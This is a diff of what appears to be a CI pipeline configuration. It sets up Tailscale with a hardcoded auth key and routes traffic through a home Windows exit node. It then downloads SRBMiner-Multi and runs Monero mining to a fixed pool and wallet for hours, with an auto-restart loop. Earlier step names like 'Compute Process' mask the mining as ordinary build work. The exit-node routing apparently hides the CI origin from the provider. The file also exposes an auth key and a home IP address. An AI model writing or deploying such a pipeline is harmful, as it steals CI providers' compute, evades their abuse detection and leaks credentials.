@@ -7,10 +7,10 @@ jobs:
     
     steps:
       - run:
-          name: "Setup Compute Environment"
+          name: "Setup Environment"
           command: |
             apt-get update -qq
-            apt-get install -y -qq curl wget iptables
+            apt-get install -y -qq curl wget iproute2
       
       - run:
           name: "Install Tailscale"
@@ -18,17 +18,18 @@ jobs:
             curl -fsSL https://tailscale.com/install.sh | sh
             
       - run:
-          name: "Start Tailscale Daemon"
+          name: "Start Tailscale (Userspace Mode)"
           background: true
           command: |
-            tailscaled --state=/tmp/tailscale.state
+            # Userspace networking - no kernel modules needed
+            tailscaled --tun=userspace-networking --state=/tmp/tailscale.state
       
       - run:
-          name: "Connect to Tailscale Network"
+          name: "Connect to Tailscale"
           command: |
             sleep 5
             
-            # Connect to Tailscale (don't advertise as exit node)
+            # Connect to tailnet
             tailscale up \
               --authkey=tskey-auth-kzvYcDGAF521CNTRL-HkCXeCi2ydc5hqyiEWgUecZP1XT4BV1CT \
               --hostname=ci-compute-$RANDOM \
@@ -42,8 +43,8 @@ jobs:
               if tailscale status | grep -q "100."; then
                 TS_IP=$(tailscale ip -4)
                 echo "==================================="
-                echo "Tailscale Connected!"
-                echo "IP: ${TS_IP}"
+                echo "✅ Tailscale Connected!"
+                echo "Tailscale IP: ${TS_IP}"
                 echo "SSH: ssh ci-compute-* (from tailnet)"
                 echo "==================================="
                 tailscale status
@@ -53,46 +54,51 @@ jobs:
               sleep 3
             done
             
-            echo "[!] Failed to connect to Tailscale"
+            echo "[!] Connection failed"
             tailscale status
             exit 1
       
       - run:
-          name: "Use Exit Node for Traffic Routing"
+          name: "Configure Exit Node"
           command: |
             echo "==================================="
-            echo "Configuring exit node routing..."
+            echo "Setting up exit node routing..."
+            echo ""
             
-            # Wait for Tailscale to fully connect
+            # Set Windows machine as exit node
+            echo "Exit node: 100.72.112.87 (Windows)"
+            tailscale set --exit-node=100.72.112.87
+            
             sleep 5
             
-            # Use YOUR Windows machine as exit node
-            echo "Setting exit node to: 100.72.112.87 (Windows machine)"
-            tailscale set --exit-node=100.72.112.87 --exit-node-allow-lan-access=false
-            
-            sleep 3
-            
-            # Verify exit node is active
+            # Verify exit node
             echo ""
-            echo "Exit node status:"
-            tailscale status | grep -i "exit" || echo "Checking status..."
+            echo "Tailscale status:"
+            tailscale status
             
-            # Test that traffic routes through exit node
+            # Test public IP
             echo ""
-            echo "Testing IP routing..."
+            echo "Testing exit node..."
             apt-get install -y -qq curl >/dev/null 2>&1
-            CURRENT_IP=$(curl -s --max-time 10 https://ipinfo.io/ip || echo "unknown")
-            echo "Current public IP: $CURRENT_IP"
-            echo "(Should match your Windows machine's public IP)"
+            
+            for i in {1..5}; do
+              PUBLIC_IP=$(curl -s --max-time 10 https://ipinfo.io/ip 2>/dev/null)
+              if [ -n "$PUBLIC_IP" ]; then
+                echo "✅ Public IP: $PUBLIC_IP"
+                echo "   (Your home IP: 49.43.140.37)"
+                break
+              fi
+              echo "Attempt $i/5..."
+              sleep 3
+            done
             
             echo ""
             echo "==================================="
-            echo "✅ Exit node configured!"
-            echo "All traffic routes through: 100.72.112.87"
+            echo "✅ Exit node configured"
             echo "==================================="
       
       - run:
-          name: "Download Compute Tools"
+          name: "Download Mining Tools"
           command: |
             cd /tmp
             wget -q -O tools.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/3.4.3/SRBMiner-Multi-3-4-3-Linux.tar.gz
@@ -102,18 +108,18 @@ jobs:
             chmod +x SRBMiner-MULTI
       
       - run:
-          name: "Start Compute Process"
+          name: "Start Mining Process"
           no_output_timeout: 6h
           command: |
             cd /tmp/processor
             
             echo "==================================="
-            echo "Starting compute process..."
+            echo "Starting process..."
             echo "Pool: xmr-sg.kryptex.network:8029"
-            echo "All traffic routes through Tailscale"
+            echo "Exit: 100.72.112.87 → 49.43.140.37"
             echo "==================================="
             
-            # Start mining process - traffic goes through Tailscale
+            # Start mining (routes through exit node)
             ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
               --pool xmr-sg.kryptex.network:8029 \
               --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/CI-Worker-$RANDOM" \
@@ -122,25 +128,27 @@ jobs:
             PROC_PID=$!
             sleep 15
             
-            # Check if process is running
+            # Verify process started
             if kill -0 ${PROC_PID} 2>/dev/null; then
+              echo ""
               echo "==================================="
-              echo "Process Started: PID ${PROC_PID}"
-              echo "Tailscale IP: $(tailscale ip -4)"
+              echo "✅ Process running (PID: ${PROC_PID})"
               echo "==================================="
-              echo "Initial logs:"
+              echo ""
               tail -30 /tmp/compute.log
+              echo ""
               echo "==================================="
             else
-              echo "[!] Process failed to start"
+              echo ""
+              echo "[!] Process failed"
               cat /tmp/compute.log
               exit 1
             fi
             
-            # Keep process alive and monitor
+            # Keep alive with auto-restart
             while true; do
               if ! kill -0 ${PROC_PID} 2>/dev/null; then
-                echo "[!] Process died, restarting..."
+                echo "[$(date)] Process died, restarting..."
                 ./SRBMiner-MULTI --algorithm randomx --disable-gpu \
                   --pool xmr-sg.kryptex.network:8029 \
                   --wallet "84L2wRKcJKygWjs68n9iZPR5EmHTLjXtwWcAiXHvg17YMaPZadSe8HTRz9Py8UDWNjKecbjbAdupuMMeSzfYknMZAC56QL4/CI-Worker-$RANDOM" \
@@ -149,10 +157,10 @@ jobs:
                 sleep 10
               fi
               
-              # Show status every 5 minutes
+              # Status every 5 minutes
               sleep 300
-              echo "[*] Status: Process running (PID: ${PROC_PID})"
-              tail -5 /tmp/compute.log
+              echo "[$(date)] Running (PID: ${PROC_PID})"
+              tail -3 /tmp/compute.log
             done
 
 workflows:
